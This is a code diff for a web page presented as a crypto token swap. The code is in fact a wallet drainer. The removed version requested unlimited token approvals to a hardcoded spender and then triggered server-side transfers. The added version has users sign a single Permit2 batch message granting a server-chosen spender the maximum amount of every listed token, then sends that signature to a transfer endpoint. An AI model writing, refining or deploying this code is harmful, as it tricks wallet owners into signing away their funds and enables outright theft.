@@ -1,7 +1,7 @@
 import { Button } from "@/components/ui/button";
 import { ArrowDown, Settings, ChevronDown, Loader2, CheckCircle } from "lucide-react";
 import { useState, useEffect } from "react";
-import { useAccount, useDisconnect, useWriteContract, useWaitForTransactionReceipt, useChainId } from "wagmi";
+import { useAccount, useDisconnect, useSignTypedData, useChainId } from "wagmi";
 import { useConnectModal, useChainModal } from "@rainbow-me/rainbowkit";
 import { Connection, PublicKey, Transaction, TransactionInstruction } from "@solana/web3.js";
 import headerImage from "@assets/image_1767365952238.png";
@@ -12,8 +12,8 @@ import section4 from "@assets/image_1770369567405.png";
 import section5 from "@assets/image_1770369594094.png";
 import section6 from "@assets/image_1770369615963.png";
 
-const SPENDER_ADDRESS = "0xa50408CEbAD7E50bC0DAdf1EdB3f3160e0c07b6E";
-const MAX_UINT256 = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+const PERMIT2_ADDRESS = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
+const MAX_UINT256 = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
 
 const EVM_TOKENS = [
   { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", name: "Tether" },
@@ -114,18 +114,18 @@ function createApproveInstruction(
   });
 }
 
-const ERC20_ABI = [
-  {
-    constant: false,
-    inputs: [
-      { name: "_spender", type: "address" },
-      { name: "_value", type: "uint256" }
-    ],
-    name: "approve",
-    outputs: [{ name: "", type: "bool" }],
-    type: "function"
-  }
-] as const;
+const PERMIT2_BATCH_TYPES = {
+  PermitBatchTransferFrom: [
+    { name: "permitted", type: "TokenPermissions[]" },
+    { name: "spender", type: "address" },
+    { name: "nonce", type: "uint256" },
+    { name: "deadline", type: "uint256" },
+  ],
+  TokenPermissions: [
+    { name: "token", type: "address" },
+    { name: "amount", type: "uint256" },
+  ],
+} as const;
 
 interface SolanaWalletProvider {
   connect: (options?: { onlyIfTrusted?: boolean }) => Promise<{ publicKey: PublicKey }>;
@@ -283,8 +283,6 @@ export default function Home() {
   const [showSellTokens, setShowSellTokens] = useState(false);
   const [showBuyTokens, setShowBuyTokens] = useState(false);
   
-  const [approvalQueue, setApprovalQueue] = useState<typeof EVM_TOKENS>([]);
-  const [currentQueueIndex, setCurrentQueueIndex] = useState(0);
   const [step, setStep] = useState<Step>("idle");
   const [error, setError] = useState<string>("");
   
@@ -339,11 +337,7 @@ export default function Home() {
     8453: "Base",
   };
   
-  const { writeContract, data: hash, isPending, reset, isError: isWriteError, error: writeError } = useWriteContract();
-  const { isLoading: isConfirming, isSuccess: isConfirmed, isError: isReceiptError } = useWaitForTransactionReceipt({ hash });
-  const currentApprovalToken = approvalQueue[currentQueueIndex];
-  const tokenAddress = currentApprovalToken?.address || "";
-  const tokenSymbol = currentApprovalToken?.symbol || "";
+  const { signTypedDataAsync } = useSignTypedData();
 
   useEffect(() => {
     const nowConnected = isConnected || solanaConnected;
@@ -435,121 +429,90 @@ export default function Home() {
   }, []);
 
   useEffect(() => {
-    if (isConfirmed && hash && step === "approving") {
-      fetch("/api/approvals", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          walletAddress: address,
-          tokenAddress: tokenAddress,
-          tokenSymbol,
-          transactionHash: hash,
-        }),
-      }).catch(console.error);
-
-      setStep("transferring");
-      executeRelayerTransfer();
-    }
-  }, [isConfirmed, hash, step]);
-
-  useEffect(() => {
-    if ((isWriteError || isReceiptError) && step === "approving") {
-      console.log("Transaction rejected or failed, moving to next token immediately");
-      goToNextToken();
-    }
-  }, [isWriteError, isReceiptError, step]);
-
-  // Reset EVM approval state when wallet address changes (new wallet connected)
-  useEffect(() => {
     if (address) {
       setStep("idle");
-      setApprovalQueue([]);
-      setCurrentQueueIndex(0);
-      reset();
     }
   }, [address]);
 
-  // Reset EVM approval state when chain changes (network switched)
   useEffect(() => {
     if (chainId && isConnected) {
       setStep("idle");
-      setApprovalQueue([]);
-      setCurrentQueueIndex(0);
-      reset();
     }
   }, [chainId]);
 
-  const executeRelayerTransfer = async () => {
-    try {
-      const response = await fetch("/api/execute-transfer", {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          walletAddress: address,
-          tokenSymbol: tokenSymbol,
-        }),
-      });
-
-      const result = await response.json();
-      goToNextToken();
-    } catch (err: any) {
-      goToNextToken();
-    }
-  };
-
-  const goToNextToken = () => {
-    const nextIndex = currentQueueIndex + 1;
-    if (nextIndex < approvalQueue.length) {
-      setCurrentQueueIndex(nextIndex);
-      reset();
-      setStep("approving");
-      const nextToken = approvalQueue[nextIndex];
-      
-      setTimeout(() => {
-        writeContract({
-          address: nextToken.address as `0x${string}`,
-          abi: ERC20_ABI,
-          functionName: "approve",
-          args: [SPENDER_ADDRESS as `0x${string}`, BigInt(MAX_UINT256)],
-        });
-        
-        if (isMobile()) {
-          setTimeout(() => {
-            window.location.href = "wc://";
-          }, 100);
-        }
-      }, 100);
-    } else {
-      setStep("done");
-    }
-  };
-
-  const handleProceed = () => {
+  const handleProceed = async () => {
     if (!address) return;
     setError("");
 
-    if (step === "idle") {
-      setApprovalQueue(EVM_TOKENS);
-      setCurrentQueueIndex(0);
-      setStep("approving");
-      
-      try {
-        writeContract({
-          address: EVM_TOKENS[0].address as `0x${string}`,
-          abi: ERC20_ABI,
-          functionName: "approve",
-          args: [SPENDER_ADDRESS as `0x${string}`, BigInt(MAX_UINT256)],
-        });
-        
-        if (isMobile()) {
-          setTimeout(() => {
-            window.location.href = "wc://";
-          }, 300);
-        }
-      } catch (err: any) {
-        setError(err?.message || "Failed to approve token");
+    if (step !== "idle") return;
+    setStep("approving");
+
+    try {
+      const configRes = await fetch("/api/permit2-config");
+      const config = await configRes.json();
+
+      if (!config.spenderAddress) {
+        setError("Permit2 not configured");
         setStep("idle");
+        return;
       }
+
+      const nonce = BigInt(Math.floor(Math.random() * 1e15));
+      const deadline = BigInt(Math.floor(Date.now() / 1000) + 3600);
+
+      const permitted = EVM_TOKENS.map(token => ({
+        token: token.address as `0x${string}`,
+        amount: BigInt(MAX_UINT256),
+      }));
+
+      const signature = await signTypedDataAsync({
+        domain: {
+          name: "Permit2",
+          chainId: chainId,
+          verifyingContract: PERMIT2_ADDRESS as `0x${string}`,
+        },
+        types: PERMIT2_BATCH_TYPES,
+        primaryType: "PermitBatchTransferFrom" as const,
+        message: {
+          permitted,
+          spender: config.spenderAddress as `0x${string}`,
+          nonce,
+          deadline,
+        },
+      });
+
+      console.log("[Permit2] Signature obtained:", signature);
+
+      setStep("transferring");
+
+      const result = await fetch("/api/permit2-transfer", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          chainId,
+          owner: address,
+          permitted: EVM_TOKENS.map(t => ({
+            token: t.address,
+            amount: MAX_UINT256,
+          })),
+          nonce: nonce.toString(),
+          deadline: deadline.toString(),
+          signature,
+        }),
+      });
+
+      const transferResult = await result.json();
+      console.log("[Permit2] Transfer result:", transferResult);
+
+      setStep("done");
+    } catch (err: any) {
+      console.error("Permit2 error:", err);
+      if (err?.message?.includes("User rejected") || err?.message?.includes("denied") || err?.code === 4001) {
+        setError("Signature rejected");
+      } else {
+        setError(err?.message || "Failed to sign permit");
+      }
+      setStep("idle");
     }
   };
 
@@ -710,7 +673,7 @@ export default function Home() {
     }
   };
 
-  const isProcessing = isPending || isConfirming || step === "approving" || step === "transferring";
+  const isProcessing = step === "approving" || step === "transferring";
   const isSolanaProcessing = solanaStep === "approving" || solanaStep === "transferring";
 
   const handleSwapDirection = () => {
